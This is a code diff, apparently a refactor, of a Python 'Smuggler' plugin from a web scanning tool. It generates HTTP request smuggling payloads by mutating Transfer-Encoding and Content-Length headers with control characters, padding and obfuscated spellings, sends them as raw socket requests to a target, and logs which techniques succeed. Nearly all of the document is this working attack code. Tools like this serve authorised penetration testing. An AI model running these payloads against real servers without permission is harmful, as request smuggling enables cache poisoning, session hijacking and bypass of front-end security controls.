@@ -101,7 +101,7 @@ t_registered_method = [
 
 class SmugglerAttacks:
     def update_content_length(self, msg, cl ):
-        return msg.replace( 'Content-Length: 0', 'Content-Length: '+str(cl) )
+        return msg.replace('Content-Length: 0', f'Content-Length: {str(cl)}')
 
     def underjoin1(self, msg):
         msg = msg.replace( 'Transfer-Encoding', 'Transfer_Encoding' )
@@ -244,25 +244,27 @@ class SmugglerAttacks:
         return msg
 
     def spaceFF(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(255) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding:{chr(255)}')
         return msg
 
     def unispace(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(160) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding:{chr(160)}')
         return msg
 
     def accentTE(self, msg):
-        msg = msg.replace( 'Transfer-Encoding:', 'Transf'+chr(130)+'r-Encoding:' )
+        msg = msg.replace('Transfer-Encoding:', f'Transf{chr(130)}r-Encoding:')
         return msg
 
     def accentCH(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfr-Encoding: ch'+chr(150)+'nked' )
+        msg = msg.replace(
+            'Transfer-Encoding: chunked', f'Transfr-Encoding: ch{chr(150)}nked'
+        )
         return msg
 
     def chunky(self, msg):
         pad_str = ''
         pad_chunk = "F\r\nAAAAAAAAAAAAAAA\r\n"
-        for i in range(0,3000):
+        for _ in range(0,3000):
             pad_str = pad_str + pad_chunk
         msg = msg.replace( 'Transfer-Encoding: chunked\r\n\r\n', 'Transfer-Encoding: chunked\r\n\r\n'+pad_str )
         if 'Content-Length: 11' in msg:
@@ -278,99 +280,115 @@ class SmugglerAttacks:
         return msg
 
     def spacefix1_0(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(0) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding:{chr(0)}')
         return msg
     
     def spacefix1_9(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(9) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding:{chr(9)}')
         return msg
     
     def spacefix1_11(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(11) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding:{chr(11)}')
         return msg
     
     def spacefix1_12(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(12) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding:{chr(12)}')
         return msg
     
     def spacefix1_13(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(13) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding:{chr(13)}')
         return msg
    
     def spacefix1_127(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(127) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding:{chr(127)}')
         return msg
    
     def spacefix1_160(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(160) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding:{chr(160)}')
         return msg
     
     def spacefix1_255(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(255) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding:{chr(255)}')
         return msg
 
     def prefix1_0(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(0) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding: {chr(0)}')
         return msg
     
     def prefix1_9(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(9) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding: {chr(9)}')
         return msg
     
     def prefix1_11(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(11) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding: {chr(11)}')
         return msg
     
     def prefix1_12(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(12) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding: {chr(12)}')
         return msg
    
     def prefix1_13(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(13) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding: {chr(13)}')
         return msg
     
     def prefix1_127(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(127) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding: {chr(127)}')
         return msg
    
     def prefix1_160(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(160) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding: {chr(160)}')
         return msg
     
     def prefix1_255(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(255) )
+        msg = msg.replace('Transfer-Encoding: ', f'Transfer-Encoding: {chr(255)}')
         return msg
 
     def suffix1_0(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(0) )
+        msg = msg.replace(
+            'Transfer-Encoding: chunked', f'Transfer-Encoding: chunked{chr(0)}'
+        )
         return msg
    
     def suffix1_9(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(9) )
+        msg = msg.replace(
+            'Transfer-Encoding: chunked', f'Transfer-Encoding: chunked{chr(9)}'
+        )
         return msg
     
     def suffix1_11(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(11) )
+        msg = msg.replace(
+            'Transfer-Encoding: chunked', f'Transfer-Encoding: chunked{chr(11)}'
+        )
         return msg
    
     def suffix1_12(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(12) )
+        msg = msg.replace(
+            'Transfer-Encoding: chunked', f'Transfer-Encoding: chunked{chr(12)}'
+        )
         return msg
    
     def suffix1_13(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(13) )
+        msg = msg.replace(
+            'Transfer-Encoding: chunked', f'Transfer-Encoding: chunked{chr(13)}'
+        )
         return msg
    
     def suffix1_127(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(127) )
+        msg = msg.replace(
+            'Transfer-Encoding: chunked', f'Transfer-Encoding: chunked{chr(127)}'
+        )
         return msg
     
     def suffix1_160(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(160) )
+        msg = msg.replace(
+            'Transfer-Encoding: chunked', f'Transfer-Encoding: chunked{chr(160)}'
+        )
         return msg
    
     def suffix1_255(self, msg):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(255) )
+        msg = msg.replace(
+            'Transfer-Encoding: chunked', f'Transfer-Encoding: chunked{chr(255)}'
+        )
         return msg
 
 class sockRequest:
@@ -393,33 +411,30 @@ class sockRequest:
 
     def receive_all(self, sock ):
         datas = ''
-        for i in range(100):
-            chunk = sock.recv( 4096 )
-            if chunk:
+        for _ in range(100):
+            if chunk := sock.recv(4096):
                 datas = datas + chunk.decode(errors='ignore')
-                break
-            else:
-                break
+            break
         return datas
 
     def extractDatas(self):
         try:
             self.length = len(self.response )
             p = self.response.find( '\r\n'+'\r\n' )
-            self.headers = self.response[0:p]
+            self.headers = self.response[:p]
             self.headers_length = len(self.headers )
             self.content = self.response[p+len('\r\n'+'\r\n'):]
             self.content_length = len(self.content )
 
             tmp = self.headers.split( '\r\n' )
-            
+
             first_line = tmp[0].split( ' ' )
             self.status_code = int(first_line[1])
             self.status_reason = first_line[2]
 
             for header in tmp:
                 p = header.find( ': ' )
-                k = header[0:p]
+                k = header[:p]
                 v = header[p+2:]
                 self.t_headers[ k ] = v
         except Exception as e:
@@ -482,38 +497,33 @@ def generateAttackMessage( base_message, method, attack_datas ):
 
     msg = base_message.strip() + '\r\n'
     msg = am.update_content_length( msg, attack_datas['Content-Length'] )
-    msg = msg + 'Transfer-Encoding: chunked' + '\r\n'
+    msg = f'{msg}Transfer-Encoding: chunked' + '\r\n'
     msg = msg + '\r\n' + attack_datas['body']
-    msg = f( msg)
-    return msg
+    return f( msg)
 
 def generateBaseMessage( url, t_evil_headers ):
     t_urlparse = urlparse( url )
-    if t_urlparse.path:
-        query = t_urlparse.path
-    else:
-        query = '/'
+    query = t_urlparse.path if t_urlparse.path else '/'
     if t_urlparse.query:
-        query = query + '?' + t_urlparse.query
+        query = f'{query}?{t_urlparse.query}'
     if t_urlparse.fragment:
-        query = query + '#' + t_urlparse.fragment
+        query = f'{query}#{t_urlparse.fragment}'
 
-    msg = 'POST ' + query + ' HTTP/1.1' + '\r\n'
-    msg = msg + 'Host: ' + t_urlparse.netloc + '\r\n'
+    msg = f'POST {query} HTTP/1.1' + '\r\n'
+    msg = f'{msg}Host: {t_urlparse.netloc}' + '\r\n'
 
     for k,v in t_evil_headers.items():
         msg = msg + k + ': ' + v + '\r\n'
-    msg = msg + '\r\n'
-    return msg
+    return msg + '\r\n'
 
 
 history = {}
 lock    = threading.Lock()
 am      =  SmugglerAttacks()
 def check(url,base_message,method,attack_datas,output):
-    if not url in history.keys():
+    if url not in history.keys():
         history[url] = 0
-    
+
     if history[url] > MAX_VULNERABLE:
         return
 
@@ -533,7 +543,7 @@ def check(url,base_message,method,attack_datas,output):
 
     if attack_datas:
         method = attack_datas['name'] + '|' + method
-    
+
     output.append({
         'R':       result.url.ljust(0),
         'M':       method,
@@ -557,9 +567,7 @@ class Smuggler(Plugin):
         self.description = ""
 
     def presquites(self, host):
-        if utils.isalive( utils.uri(host) ):
-            return True
-        return False
+        return bool(utils.isalive( utils.uri(host) ))
 
     def main(self,host):
         output  = []
@@ -583,17 +591,17 @@ class Smuggler(Plugin):
         qtechniques = 0
         ntechniques = []
         rtechniques = []
-        savename    = host + ".sumggler.txt"
+        savename = f"{host}.sumggler.txt"
 
         for scan in output:
             isvulnerable = scan['V']
             method       = scan['M']
             status       = scan['C']
-            request      = scan['request']
-            
             if isvulnerable == True:
                 qtechniques += 1
                 ntechniques.append(method)
+                request      = scan['request']
+
                 rtechniques.append( (request) )
 
                 data.savetofile(
@@ -603,5 +611,5 @@ class Smuggler(Plugin):
 
         if qtechniques == 0:
             return Result(FAILED,None,None,None)
-        
+
         return Result(SUCCESS,"%i of smuggling techniques worked: [%s] request(s) saved at: output/%s" % (qtechniques, ', '.join(ntechniques[:4]) + "..", savename),None,None)
